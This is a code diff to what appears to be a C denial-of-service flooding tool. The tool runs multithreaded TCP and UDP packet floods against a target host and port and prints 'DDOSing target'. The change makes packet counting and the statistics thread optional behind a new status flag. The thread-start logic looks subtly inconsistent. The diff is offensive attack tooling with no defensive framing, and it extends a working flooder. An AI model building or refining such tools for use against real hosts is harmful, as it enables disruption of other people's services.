@@ -16,6 +16,7 @@ char* __host;
 int __port;
 int tcount = 0;
 pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
+bool status;
 
 bool __run;
 bool use_dos_sleep;
@@ -81,7 +82,9 @@ void _ddos_tcp(char* host, int port, char* packet)
                 pthread_mutex_unlock(&mutex);
             }
         }
-        pc++;
+        if(status){//we are displaying status so we need to count packets
+            pc++;
+        }
     }
     tcount--;
 }
@@ -109,7 +112,9 @@ void _ddos_udp(char* host, int port, char* packet)
             port = randport();
         }
         dos_udp_send(sock, host, port, packet, buf, bufsize);
-        pc++;
+        if(status){
+            pc++;
+        }
     }
     tcount--;
 }
@@ -161,8 +166,14 @@ void ddos(char* host, int port, char* packet, int _tcount, int mode)
     _dos_param* p = _init_dos_p(host, port, packet, mode);
     pthread_t* _ddos = (pthread_t*)malloc(sizeof(pthread_t) * (_tcount + 1));
     // pthread_mutex_init(&mutex, NULL);
-    pthread_create(&_ddos[0], NULL, _ddos_stat, NULL);
-    for (int i = 1; i < _tcount + 1; i++) {
+    if(status){
+        pthread_create(&_ddos[0], NULL, _ddos_stat, NULL);
+        status=1;
+    }else{
+        success("Hit ^C to exit");
+        success("DDOSing target %s",host);
+    }
+    for (int i = status; i < _tcount + 1; i++) {
         if (pthread_create(&_ddos[i], NULL, __ddos_wrapper, p)) {
             error("Failed to create thread #%d!", i);
             continue;
